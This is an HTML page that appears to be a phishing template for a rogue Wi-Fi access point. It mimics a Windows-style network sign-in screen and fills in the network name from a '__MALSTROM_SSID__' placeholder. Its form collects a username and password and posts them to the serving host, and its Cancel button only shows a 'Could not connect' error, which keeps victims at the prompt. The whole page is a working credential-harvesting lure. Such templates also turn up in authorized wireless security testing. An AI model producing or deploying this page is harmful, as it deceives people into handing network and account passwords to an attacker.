<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>Sign in to Wi-Fi network</title>
<style>
*{margin:0;padding:0;box-sizing:border-box}
html,body{height:100%}
body{font-family:"Segoe UI",-apple-system,BlinkMacSystemFont,Roboto,Arial,sans-serif;background:#0d0f17;color:#e9e9ec;display:flex;align-items:center;justify-content:center}
.win{width:100%;max-width:460px;padding:40px 32px}
.clock{text-align:center;font-size:32px;font-weight:300;letter-spacing:1px;margin-bottom:6px;color:#fff}
.date{text-align:center;font-size:14px;color:#9a9aa5;margin-bottom:32px}
.user{width:84px;height:84px;margin:0 auto 24px;border-radius:50%;background:linear-gradient(135deg,#2a3350,#1a2138);border:2px solid #3b4a73;display:flex;align-items:center;justify-content:center}
.user svg{width:44px;height:44px;fill:#8fa3d9}
h1{font-size:18px;font-weight:600;text-align:center;margin-bottom:4px}
p.hint{font-size:13px;color:#9a9aa5;text-align:center;margin-bottom:26px}
.field{margin-bottom:14px}
input[type=text],input[type=password]{width:100%;background:#141824;border:1px solid #2f3650;border-radius:6px;padding:12px 14px;color:#e9e9ec;font-size:15px;outline:none}
input:focus{border-color:#4c8dff}
.btnrow{display:flex;justify-content:space-between;align-items:center;margin-top:20px}
.ck{padding:10px 18px;border:1px solid #3a425e;border-radius:6px;font-size:13px;color:#bdbdcc}
button{background:#2f6df6;border:none;border-radius:6px;padding:12px 42px;color:#fff;font-size:15px;cursor:pointer}
button:active{background:#2758c6}
.err{display:none;color:#e5534b;font-size:13px;text-align:center;margin-top:14px}
</style>
</head>
<body>
<div class="win">
  <div class="clock" id="clock"></div>
  <div class="date" id="date"></div>
  <div class="user"><svg viewBox="0 0 24 24"><path d="M12 12a4 4 0 1 0-4-4 4 4 0 0 0 4 4zm0 2c-2.67 0-8 1.34-8 4v2h16v-2c0-2.66-5.33-4-8-4z"/></svg></div>
  <h1>Sign in</h1>
  <p class="hint">This connection requires authentication. Enter your password to access "__MALSTROM_SSID__".</p>
  <form id="f" action="/" method="post">
    <div class="field"><input type="text" id="username" name="username" placeholder="User name" autocomplete="off"></div>
    <div class="field"><input type="password" id="password" name="password" placeholder="Password" autocomplete="current-password" required autofocus></div>
    <div class="btnrow">
      <span class="ck" id="cancel">Cancel</span>
      <button type="submit">Sign in</button>
    </div>
  </form>
  <div class="err" id="err">Could not connect. Try again.</div>
</div>
<script>
(function(){
  var n=new Date();
  document.getElementById('clock').textContent=n.toLocaleTimeString([],{hour:'2-digit',minute:'2-digit'});
  document.getElementById('date').textContent=n.toLocaleDateString([],{weekday:'long',month:'long',day:'numeric'});
  var c=document.getElementById('cancel');
  if(c){c.addEventListener('click',function(){document.getElementById('err').style.display='block'});}
})();
</script>
</body>
</html>
